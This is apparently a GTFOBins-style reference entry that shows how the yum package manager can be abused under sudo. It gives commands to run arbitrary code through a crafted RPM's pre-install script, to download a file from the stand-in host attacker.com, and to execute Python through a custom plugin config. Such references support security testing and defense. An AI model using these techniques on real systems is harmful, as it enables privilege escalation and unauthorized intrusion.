---
type: gtfobin
name: yum
platform: Unix
functions: [command, download, inherit]
tags: [gtfobin, unix, lotl]
---

# yum

## command

```bash
yum localinstall -y x-1.0-1.noarch.rpm
```
_Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install .x.sh .
```_
**Contexts:** sudo

## download

```bash
yum install http://attacker.com/path/to/input-file.rpm
```
_The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`._
**Contexts:** sudo

## inherit

```bash
cat >/path/to/temp-dir/x<<EOF
[main]
plugins=1
pluginpath=/path/to/temp-dir/
pluginconfpath=/path/to/temp-dir/
EOF

cat >/path/to/temp-dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >/path/to/temp-dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c /path/to/temp-dir/x --enableplugin=y
```
_This allows to run Python code (`...`)._
**Contexts:** sudo
